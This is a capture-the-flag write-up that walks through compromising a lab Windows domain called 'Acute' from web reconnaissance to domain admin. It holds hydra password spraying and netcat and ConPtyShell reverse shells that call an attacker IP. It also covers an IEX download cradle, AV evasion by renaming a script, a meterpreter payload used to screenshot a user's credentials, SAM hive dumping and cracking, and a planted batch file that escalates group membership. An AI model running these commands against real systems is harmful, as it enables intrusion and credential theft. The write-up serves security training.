
## CTF Writeup: Acute

---
## Reconnaissance

An initial TCP scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.136.40
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 08:39 -0500
Nmap scan report for 10.129.136.40
Host is up (0.028s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
|_ssl-date: 2026-08-25T13:43:22+00:00; +3s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1

Host script results:
|_clock-skew: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 216.58 seconds
```

Another UDP Scan revealed that there is no running UDP Services on the target server.

```
nmap -sU --top-ports 100 -oN nmap_udp.txt 10.129.136.40
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 08:55 -0500
Nmap scan report for 10.129.136.40
Host is up (0.073s latency).
All 100 scanned ports on 10.129.136.40 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
```

The TCP Scan revealed interesting information about SAN's including atsserver.acute.local, atsserver. Let's map them to the target ip address in our local dns file.

```
echo "10.129.136.40 atsserver.acute.local acute.local atsserver" | tee -a /etc/hosts
```

Upon inspecting the webpage at atsserver.acute.local, we get directed to an healthcare webpage.

In the /about.html endpoint we get information about potential usernames.

```
Aileen Wallace
Charlotte Hall
Evan Davies
Ieuan Monks
Joshua Morgan
Lois Hopkins
```

I was able to discover an interesting functionality called "New Starter Forms" button, when pressing one of the tabs in the /about.html endpoint. Which downloaded an .docx file. 

The .docx file seems to be related to the Onboarding Process of an new employee.
When reading the .docx file it's providing us with an "default" password:

```
Password1!
```

It also revealed that "Lois" which is probably Lois Hopkins is the only authorized personel to change Group Memberships, only her can become Site Admin.

We were also able to identify some endpoints, which didn't load tho.

```
/Staff
/Acute_Staff_Access
```

I proceeded with storing the retrieved users and default password inside an users.txt and passwords.txt.

Since those are just for and surnames I'll use my custom username generator script in order to generate an users wordlist!

```
python3 username_generator.py --all /ctfs/htb/ad/acute/creds/users.txt > users.txt
```

The endpoint which is most interesting was an /Acute_Staff_Access endpoint which forwarded us to "Windows PowerShell Web Access" & also provided information that the Domain Controller seems to be ran on Windows Server 2016.

Let's try & bruteforce the powershell web login panel.

```
hydra -L users.txt -P passwords.txt atsserver.acute.local https-post-form "/Acute_Staff_Access/en-US/logon.aspx?ReturnUrl=%2fAcute_Staff_Access:__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE0NzgxMTkyOTcPZBYCZg9kFgICAQ9kFgQCAQ8WAh4HVmlzaWJsZWhkAgUPZBYEAgEPFgIfAGgWBAIFDw8WAh4EVGV4dAUGRGVsZXRlZGQCBw8PFgIfAQULTmV3IFNlc3Npb25kZAICD2QWBAIBDw8WAh8BBUlTaWduLWluIGZhaWxlZC4gIFZlcmlmeSB0aGF0IHlvdSBoYXZlIGVudGVyZWQgeW91ciBjcmVkZW50aWFscyBjb3JyZWN0bHkuZGQCAw9kFhQCAQ8WAh4FY2xhc3MFGnJlcXVpcmVkIGVycm9yIGVycm9yIGVycm9yZAIDDxYCHwIFGnJlcXVpcmVkIGVycm9yIGVycm9yIGVycm9yZAIHDxYCHwIFGnJlcXVpcmVkIGVycm9yIGVycm9yIGVycm9yZAIJDxYCHwIFCHJlcXVpcmVkZAILDxYCHwIFCHJlcXVpcmVkZAINDxYCHwIFCHJlcXVpcmVkZAIPDxYCHwIFGnJlcXVpcmVkIGVycm9yIGVycm9yIGVycm9yZAIVDxYCHwIFEHJlcXVpcmVkIGRlZmF1bHRkAhcPFgIfAgUQcmVxdWlyZWQgZGVmYXVsdGQCHQ8PFgIfAQUHU2lnbiBJbmRkZA%2BhB7BU6dT9jDVEes26hLG168saRG4uurKhutirs5Uo&__VIEWSTATEGENERATOR=A9B885AF&__EVENTVALIDATION=%2FwEdABA%2BdJ%2FmLA7LDnBEtHf9ZbNeOGmAeYnrCn7l4HKpS0S3PrgsETBjMT6GhrSrOTblFa4oEZV%2BmS7OYlgMO%2FYC4GlLi0gJ8YEbHiccZGZU3FMKqQODz%2BnnTbMB0U%2BsnJoa%2FVGSAmrkIv6M8J3P%2FCQJfUz5%2FQiZFa1%2Bi9bo6WF9GgmOpfdYcS7dPEFdYM27aKu8bC6Jj2NY3SOcTG6NWDdH8E%2FTObX7eikOGF9Lcjcxb0yJrQ3fDD0NdUwYheZCbQiee7KuocNWmjMwttcI4ErUCx7iG0NcpRoJPZDUdkzXi9kBovUSO9m0FmharJXDgO6iY3GP%2FypXhvJY6eYlu%2FRsa9C9DD%2F%2FkpU3SVzj90u0eWV%2Fii151qnIubEsLxWeOusMgbY%3D&ctl00%24MainContent%24userNameTextBox=^USER^&ctl00%24MainContent%24passwordTextBox=^PASS^&ctl00%24MainContent%24connectionTypeSelection=computer-name&ctl00%24MainContent%24targetNodeTextBox=atsserver&ctl00%24MainContent%24connectionUriTextBox=&ctl00%24MainContent%24altUserNameTextBox=&ctl00%24MainContent%24altPasswordTextBox=&ctl00%24MainContent%24configurationNameTextBox=Microsoft.PowerShell&ctl00%24MainContent%24authenticationTypeSelection=0&ctl00%24MainContent%24useSslSelection=0&ctl00%24MainContent%24portTextBox=5985&ctl00%24MainContent%24applicationNameTextBox=WSMAN&ctl00%24MainContent%24allowRedirectionSelection=0&ctl00%24MainContent%24advancedPanelShowLabel=&ctl00%24MainContent%24ButtonLogOn=Sign+In"
```

Inspected the .docx file with exiftool to extract metadata & identified interesting information about "ACUTE-PC01", an Creator called "FCastle", and another potential user called "Daniel".

I then tried to manually prompt credentials inside PSWA with ACUTE-PC01 with the following format: first letter of the first name and then the surname.

The following credentials worked and we got shell on ACUTE-PC01.

```
edavies:Password1!
```

Since we now got an PSWA Session, let's utilize this command execution to get an reverse shell on ACUTE-PC01.

Started up netcat listener on port 443.

```
rlwrap nc -lvnp 443
```

Started up python3 webserver inside the directory in which my nc.exe is stored.

```
python3 -m http.server 80
```

Transfered nc.exe onto the target server.

```
iwr -uri http://10.10.14.57/nc.exe -OutFile C:\Users\edavies\Documents\nc.exe
```

Executed the following command, but this didn't workout since AV detected it.

```
./nc.exe 10.10.14.57 443 -e cmd.exe
```

In order to bypass AV we can use 

```
https://github.com/antoniococo/conptyshell
```

I first modified the .ps1 script so it doesn't include ConPtyShell Name anymore and replaced it with the word "saitama", removed the whole how to description and changed the name of the script.

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Transfered the .ps1 script onto the target server.

```
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.57/av_evasion_rev.ps1")
```

Now we need to Invoke the Function, which we changed to "saitama".

```
saitama 10.10.14.57 3001
```

Gained RCE as user "edavies" on ACUTE-PC01.

Enumerated Installed Applications and only identified Microsoft Edge Browser being active.

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

We can enumerate directories which have an exception on Windows Defender:

```
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

Let's check for credentials or browser history!

Transfered Seatbelt.exe onto the target server for this:

```
iwr -uri http://10.10.14.57/Seatbelt.exe -OutFile Seatbelt.exe
```

Executed it and find interesting entries of an /Storage/Files Directory in the Web-Root.

But wasn't able to identify anything interesting.

Transfered winPEAS onto the target server.

```
iwr -uri http://10.10.14.57/winPEASx64.exe -OutFile winPEAS.exe
```

winPEAS identified some interesting behaviour. Apparently the real edavies is logged in right now and is doing stuff currently. We could sniff on him using metasploit's screenshot functionality, but let's first verify if it's true that he has an active session on the device.

Also metasploit has an interesting tool called "qwinsta" which allows us to check current sessions, we were also retrieve that edavies has an active session here by that.

```
qwinsta /server:127.0.0.1
```

The "SI" parameter reveals if there is an active session, when one of the numbers is higher than 0.

```
Get-Process
```

It is! Let's get an meterpreter shell in order to sniff on the user and to screenshot what he is doing!

1. Creating payload.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.57 LPORT=9002 -f exe -o met.exe
```

2. Started up metasploit

```
msfdb run
```

3. Transfered payload onto the target server.

```
wget http://10.10.14.57/met.exe -o met.exe
```

4. Started up metasploit listener

```
use /exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 9002
exploit -j
```

5. Executed payload on target

```
.\met.exe
```

Gained Meterpreter Session

```
sessions
sessions 1
```

6. Enumerate Processes and search for explorer

```
ps
```

7. Migrate to the Explorer PID

```
migrate 1308
```

8. Now we can screenshot.

```
screenshot
```

I screenshotted a couple of times and gained new credentials for user "imonks". Apparently the current user was creating an ps credential object to get another ps-session to "atsserver" and we screenshotted the process! 

```
imonks:W3_4R3_th3_f0rce.
```

![](Pasted%20image%2020260827134653.png)

He utilized an special "ConfigurationName" dc_manage, which is probably an custom Configuration and the Connection itself error's out due to an "Measure-Object" missing. Which could be an problem with the configuration itself.

We can create an credential object aswell.

```
$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
```

```
$cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks",$pass)
```

```
Enter-PSSession -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage
```

We get the same error that the "Measure-Object" is not found, which is most likely an issue of the configuration itself. But we can utilize an functionality called "Invoke-Command" to use this PSSession to execute commands on ATSSERVER.

```
Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

This worked we are user "imonks".

Enumerated Commands which we can use.

```
Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

Get-Alias
Get-ChildItem
Get-Command
Get-Content
Get-Location
Set-Content
Set-Location
Write-Output
```

Enumerated Aliases aswell for easy usability.

```
Invoke-Command -ScriptBlock { Get-Alias } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

cat -> Get-Content
cd -> Set-Location
ls -> Get-ChildItem
pwd -> Get-Location
sc -> Set-Content
type -> Get-Content
```

Enumerated in which directory we are right now.

```
Invoke-Command -ScriptBlock { Get-Location } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred      

Path                      PSComputerName
----                      --------------
C:\Users\imonks\Documents ATSSERVER
```

Enumerated Desktop of user "imonks". Found the user.txt flag and also an interesting wm.ps1 script.

```
Invoke-Command -ScriptBlock { Get-ChildItem ..\Desktop } -ComputerName ATSSERVER -ConfigurationName dc_manage -C
redential $cred


    Directory: C:\Users\imonks\Desktop


Mode                 LastWriteTime         Length Name                                  PSComputerName
----                 -------------         ------ ----                                  --------------
-ar---        26/08/2026     21:23             34 user.txt                              ATSSERVER
-a----        11/01/2022     18:04            602 wm.ps1                                ATSSERVER
```

Retrieved user.txt in C:\Users\imonks\Desktop.

```
Invoke-Command -ScriptBlock { cat ..\Desktop\user.txt } -ComputerName ATSSERVER -ConfigurationName dc_manage -Cr
edential $cred                                                                                                               
8f0b9b9aa520906ce8395957b290b983
```

Upon inspecting the .ps1 script we get new credentials, but the password seems strongly encrypted.

```
Invoke-Command -ScriptBlock { cat ..\Desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Cred
ential $cred                                                                                                                 
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000
c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f672800000094971
41b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51' 
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

The script runs Get-Volume on ACUTE-PC01 as user jmorgan. As we know from previous enum. User "jmorgan" is local admin on ACUTE-PC01.

Unfortunately we can't run Get-Volume as user imonks on ACUTE-PC01. Access got denied. I'm assuming only high privileged users can run it. But we can try to modify the script and replace the Get-Volume command execution with an reverse connection using netcat to our local listener.

Modified the script:

```
Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc.exe -e cmd 10.10.14.57 443') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Started up my netcat listener on port 443.

```
rlwrap nc -lvnp 443
```

Ran the script:

```
Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Gained RCE as user "jmorgan". We are Admin on ACUTE-PC01 now.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.62.38] 49876
Microsoft Windows [Version 10.0.19044.1466]
(c) Microsoft Corporation. All rights reserved.

C:\Users\jmorgan\Documents>
```

Let's perform post exploitation now. I extracted the SAM & SYSTEM Hive out of the registry and stored it inside the directory which isn't being affected by Windows Defender.

```
reg save hklm\sam C:\Utils\SAM sam.bak
reg save hklm\sam C:\Utils\SYSTEM system.bak
```

Unfortunately I wasn't able to connect to my SMB Share for file transfer. But since the hives are inside the Utils directory, we can use our meterpreter session to "download" them.

```
download sam.bak
download system.bak
```

Dumped Credentials from Memory locally.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system system.bak -sam sam.bak local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
[*] Cleaning up...
```

Stored all of the hashes inside an "hashes" file on my local machine and ran hashcat over them.

```
hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt
```

Retrieved the password of the local Administrator User of "ACUTE-PC01"

```
Administrator:Password@123
```

Let's try & use all of the usernames manually using PS Credential Objects with the new password on ATSSERVER.

```
$pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force
```

```
$cred = New-Object System.Management.Automation.PSCredential("ACUTE\awallace", $pass)
```

```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami }
```

This worked!

Let's check C:\Program Files, since this is always an good place for priv esc.

```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls ../../../"Program Files" }
```

We can see that there is very interesting services installed. Let's check out the keepmeon application first.

```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls ../../../"Program Files"/keepmeon }
```

In the directory is an interesting .bat file which is very unusual. Let's check it out.

```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat ../../../"Program Files"/keepmeon/keepmeon.bat }
```

the script apparently runs as user Lois. From previous enumeration we know that user Lois Hopkins is "Site Admin". The script runs every 5 minutes.

```
REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)
```

Enumerated Groups on the Domain.

```
Invoke-Command -ScriptBlock { net group /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

When enumerating the Site_Admins group I gained interesting information that the Site_Admin Group has access to the Domain Admins.

```
PS C:\Utils> Invoke-Command -ScriptBlock { net group Site_Admin /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Invoke-Command -ScriptBlock { net group Site_Admin /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members

-------------------------------------------------------------------------------
The command completed successfully.
```

Since all .bat scripts in this directory are being ran every 5 minutes as user Lois Hopkins, we can simply write an .bat script which adds our current user awallace to the Site_Admin Group!

```
Invoke-Command -ScriptBlock { Set-Content -Path '\program files\keepmeon\hacked.bat' -Value 'net group site_admin awallace /add /domain'} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Viewed the script and it had the correct input. Now after 5 minutes our current user "awallace" should be part of the Site_Admin Group.

```
Invoke-Command -ScriptBlock { cat '\program files\keepmeon\hacked.bat' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

After waiting a bit we can verify that our current user is part of the Site_Admin Group. Which means we should also be on the same level as Domain Admin on ATSSERVER.

```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net group Site_Admin /domain }
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
Invoke-Command -ComputerName ATSSERVER -Credential $cred -ScriptBlock { cat /Users/Administrator/Desktop }
a21f2268b230439254fbe1f74c72fa3c
```
